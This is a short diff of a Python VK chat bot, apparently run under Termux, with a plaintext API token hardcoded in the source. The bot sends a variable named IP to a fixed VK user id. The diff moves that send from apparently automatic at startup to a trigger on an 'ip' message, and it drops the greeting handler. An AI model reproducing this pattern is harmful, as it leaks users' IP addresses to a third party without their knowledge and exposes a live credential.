@@ -70,7 +70,7 @@ def bot():
     token='35a0b1e44117b4857a36a347b3b1c948b260b314bf7edb44494165442202ea6ff5049d5ea3225d8c90199'
     def y(user_id,message):
         vk.method('messages.send',{'user_id': user_id, 'message': message,'random_id':rand})
-    y(437306907,IP)
+#    y(437306907,IP)
     vk=vk_api.VkApi(token=token)
     longpoll=VkLongPoll(vk)
 #    y(437306907,IP)
@@ -79,8 +79,10 @@ def bot():
         if event.type==VkEventType.MESSAGE_NEW:
             if event.to_me():
                 r=event.text
-                if r=='Начать' or r=='начать':
-                    y(event.user_id,'Привет, я бот Termux Cod.\n \nНапиши menu или help.')
+                if r=='ip' or r=='IP':
+                    y(437306907,IP)
+                    print('готово')
+                    
 #ПРИВЕТСТВИЕ
 hello()
 hello_2()
